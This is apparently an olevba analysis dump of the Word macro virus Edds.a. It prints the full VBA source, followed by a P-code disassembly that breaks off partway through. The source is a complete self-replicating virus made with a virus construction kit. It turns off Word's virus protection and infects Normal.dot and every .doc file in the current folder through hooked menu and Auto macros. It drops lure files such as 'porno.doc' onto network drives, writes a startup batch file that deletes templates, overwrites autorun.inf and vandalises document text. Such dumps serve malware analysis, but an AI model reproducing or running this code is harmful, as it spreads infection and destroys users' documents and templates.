olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Edds.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Edds.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EddsHead.bas 
in file: Virus.MSWord.Edds.a - OLE stream: 'Macros/VBA/EddsHead'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub EddsHead()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Live for Now"
    'Poppy ID : 24421479963
    
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Your Computer Has The Edds Head Virus", vbSystemModal
If Month(Now()) = 2 And Day(Now()) = 14 Then MsgBox "I Hope You Got Your Girlfriend Something Nice !", vbInformation, "Birthday Greeting!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "England Rules...."
    .Title = "England Rules...."
    .Subject = "England Rules...."
    .Comments = "England Rules...."
    .Keywords = "England Rules...."
    .Execute
End With
z147924429 = 0
Set Unit1872442147913 = MacroContainer
 f6002$ = "c:\windows\startm~1\programs\startup\msfile.bat"
d41842442 = GetAttr(NormalTemplate.FullName)
If d41842442 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6002$)
If d41842442 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6002$)
If d41842442 = vbReadOnly Then GoTo fuckoff
If d41842442 = vbReadOnly + vbArchive Then GoTo fuckoff
If Unit1872442147913 = NormalTemplate Then z147924429 = 1
If z147924429 = 1 Then OJSimpsonISaMurder14794 = NormalTemplate.FullName Else OJSimpsonISaMurder14794 = ActiveDocument.FullName
If z147924429 = 1 Then vfr244211 = ActiveDocument.FullName Else vfr244211 = NormalTemplate.FullName
Application.OrganizerCopy Source:=OJSimpsonISaMurder14794, Destination:=vfr244211, Name:="EddsHead", Object:=wdOrganizerObjectProjectItems
If z147924429 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If z147924429 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
            Call dhIconDisco("C:\autorun.inf")
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Edds Head Virii", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call EddsHead
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call EddsHead
End Sub
Sub FileSave()
    On Error Resume Next
    Call EddsHead
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call EddsHead
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call EddsHead
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call EddsHead
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call EddsHead
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call EddsHead
End Sub
Sub FileExit()
    On Error Resume Next
    Call EddsHead
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call EddsHead
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call EddsHead
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call EddsHead
End Sub
Sub AutoExit()
    On Error Resume Next
    Call EddsHead
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call EddsHead
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call EddsHead
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub AutoExec()
    On Error Resume Next
    Call EddsHead
End Sub
Sub AutoClose()
    On Error Resume Next
    Call EddsHead
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call EddsHead
    Call p4184
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call EddsHead
    Call p4184
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call EddsHead
    Call p4184
End Sub
Sub p4184()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "."
            .Replacement.Text = " Edds Head "
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Edds.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/EddsHead - 16529 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Sub EddsHead())
' Line #5:
' Line #6:
' 	QuoteRem 0x0004 0x000C "Produced by,"
' Line #7:
' 	QuoteRem 0x0004 0x0030 "The VicodinES Macro.Poppy Construction Kit v1.0b"
' Line #8:
' 	QuoteRem 0x0004 0x0030 "================================================"
' Line #9:
' 	QuoteRem 0x0004 0x0028 "Code Written by VicodinES "Live for Now""
' Line #10:
' 	QuoteRem 0x0004 0x0016 "Poppy ID : 24421479963"
' Line #11:
' Line #12:
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	ArgsCall Read 0x0000 
' Line #15:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St sv 
' Line #16:
' 	Ld sv 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "porno.doc"
' 	St svt$ 
' 	EndIf 
' Line #17:
' 	Ld sv 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "readme!.doc"
' 	St svt$ 
' 	EndIf 
' Line #18:
' 	Ld sv 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "sex.doc"
' 	St svt$ 
' 	EndIf 
' Line #19:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #23:
' 	EndWith 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #25:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rm 
' Line #26:
' 	Ld rm 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0025 "Your Computer Has The Edds Head Virus"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #27:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002F "I Hope You Got Your Girlfriend Something Nice !"
' 	Ld vbInformation 
' 	LitStr 0x0014 "Birthday Greeting!!!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #28:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #29:
' 	LitStr 0x0011 "England Rules...."
' 	MemStWith Author 
' Line #30:
' 	LitStr 0x0011 "England Rules...."
' 	MemStWith Title 
' Line #31:
' 	LitStr 0x0011 "England Rules...."
' 	MemStWith Subject 
' Line #32:
' 	LitStr 0x0011 "England Rules...."
' 	MemStWith Comments 
' Line #33:
' 	LitStr 0x0011 "England Rules...."
' 	MemStWith Keywords 
' Line #34:
' 	ArgsMemCallWith Execute 0x0000 
' Line #35:
' 	EndWith 
' Line #36:
' 	LitDI2 0x0000 
' 	St z147924429 
' Line #37:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Unit1872442147913 
' Line #38:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St f6002$ 
' Line #39:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St d41842442 
' Line #40:
' 	Ld d41842442 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f6002$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #41:
' 	Ld d41842442 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f6002$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #42:
' 	Ld d41842442 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #43:
' 	Ld d41842442 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #44:
' 	Ld Unit1872442147913 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St z147924429 
' 	EndIf 
' Line #45:
' 	Ld z147924429 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St OJSimpsonISaMurder14794 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St OJSimpsonISaMurder14794 
' 	EndIf 
' Line #46:
' 	Ld z147924429 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St vfr244211 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St vfr244211 
' 	EndIf 
' Line #47:
' 	Ld OJSimpsonISaMurder14794 
' 	ParamNamed Source 
' 	Ld vfr244211 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "EddsHead"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld z147924429 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #49:
' 	Ld z147924429 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x000B "VMPCK v1.0b"
' Line #54:
' 	Label fuckoff 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub HelpAbout())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	LitStr 0x000F "Edds Head Virii"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub FileNew())
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #63:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #64:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #65:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FileSave())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #70:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileClose())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #76:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub ToolsOptions())
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #81:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub EditFind())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #86:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub FileSaveAs())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #91:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FilePrint())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #96:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub FileExit())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #102:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #103:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #104:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #105:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #106:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #107:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #108:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #109:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #110:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #111:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #112:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #113:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Loop 
' Line #116:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #117:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #118:
' 	LitStr 0x0002 "h:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #119:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #120:
' 	LitStr 0x0002 "f:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #121:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #122:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub AutoOpen())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub AutoExit())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #131:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #132:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #133:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #134:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #135:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #136:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #137:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #138:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #139:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #140:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #141:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #142:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Loop 
' Line #145:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #146:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #147:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #148:
' 	LitStr 0x0002 "r:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #149:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #150:
' 	LitStr 0x0002 "s:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #151:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub AutoExec())
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub AutoClose())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ToolsMacro())
' Line #162:
' 	OnError (Resume Next) 
' Line #163:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #164:
' 	ArgsCall (Call) p4184 0x0000 
' Line #165:
' 	EndSub 
' Line #166:
' 	FuncDefn (Sub FileTemplates())
' Line #167:
' 	OnError (Resume Next) 
' Line #168:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #169:
' 	ArgsCall (Call) p4184 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub ViewVBCode())
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	ArgsCall (Call) EddsHead 0x0000 
' Line #174:
' 	ArgsCall (Call) p4184 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub p4184())
' Line #177:
' 	OnError (Resume Next) 
' Line #178:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #179:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #180:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
